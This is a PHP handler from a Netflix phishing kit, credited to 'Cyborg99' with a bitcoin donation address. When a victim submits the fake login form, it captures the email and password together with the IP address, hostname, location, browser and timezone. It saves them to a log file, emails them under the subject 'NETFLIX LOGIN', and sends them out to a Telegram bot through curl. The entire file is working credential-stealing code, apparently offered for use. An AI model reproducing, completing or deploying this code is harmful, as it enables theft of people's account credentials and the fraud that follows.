<?php
// REM by Cyborg99 Please donate if you like it : 1J2M2J7cbzCYULG99NgWgttVJK7dkuUEz5
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}
if (isset($_POST['eme']) && isset($_POST['pss'])) {
    session_start();
	include '../inc/check_blocked.php';
	$tanitatikaram = parse_ini_file("../proxy.ini", true);
	$zed = $tanitatikaram['reportmail'];
	$chatId = $tanitatikaram['chatid'];
	$botUrl = $tanitatikaram['telegram'];
    $Cookie['cookie_file'] = __DIR__ . '/logs/' . sha1(time()) . '.log';
        $_SESSION['computer'] = gethostbyaddr($_SERVER['REMOTE_ADDR']) . " | {$_POST['screen']}";
        $msg .= "=========== <[ Edited by Cyborg99 ]> ===========\r\n";
        $msg .= "> Login\r\n";
        $msg .= "EMAIL        : {$_POST['eme']}\r\n";
        $msg .= "PASS        : {$_POST['pss']}\r\n";
		$msg .= "\r\n";
        $msg .= "--------------------- IP Info ---------------------\r\n";
        $msg .= "COMPUTER    : {$_SESSION['computer']}\r\n";
        $msg .= "IP ADDRESS    : {$_SESSION['ip']}\r\n";
        $msg .= "LOCATION    : {$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
        $msg .= "BROWSER        : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
        $msg .= "USER AGENT    : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $msg .= "TIMEZONE    : {$_SESSION['ip_timezone']}\r\n";
        $msg .= "TIME        : " . now() . " GMT\r\n";
        $msg .= "=========== <[ Edited by Cyborg99 ]> ===========\r\n\r\n\r\n";
        $rand = dechex(rand(0x000000, 0xFFFFFF));
        $save = fopen("../../logs/Login-".$rand.".txt", "a+");
        fwrite($save, $msg);
        fclose($save);
        $subject = "NETFLIX LOGIN [" . $_POST['eme'] . "] From [" . $_SESSION['ip_countryName'] . "] {$_SESSION['ip']}";
		$headers = "From: New Netflix Login <mailer@mail.ma>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($zed, $subject, $msg, $headers);
    $send = ['chat_id'=>$chatId,'text'=>$msg];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
        
}
?>